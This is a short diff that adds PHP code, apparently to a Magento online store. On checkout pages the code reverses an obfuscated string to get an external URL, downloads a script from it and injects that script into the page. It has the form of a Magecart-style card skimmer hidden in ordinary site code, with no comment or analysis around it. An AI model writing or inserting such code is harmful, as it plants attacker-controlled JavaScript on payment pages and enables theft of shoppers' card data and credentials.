@@ -1,0 +1,7 @@
+$url_xhjx = $_SERVER['REQUEST_URI'];
+$isValidUrl_dhjkc = preg_match('/onepage|checkout|onestep|firecheckout/', $url_xhjx);
+$mage_fgc = strrev("php.tpircs-egam/us.repus-sj//:sptth");
+if($_SERVER['REQUEST_METHOD'] === 'GET' && $isValidUrl_dhjkc){
+        $efwfe = file_get_contents($mage_fgc);
+        echo "<script>".$efwfe."</script>";
+}
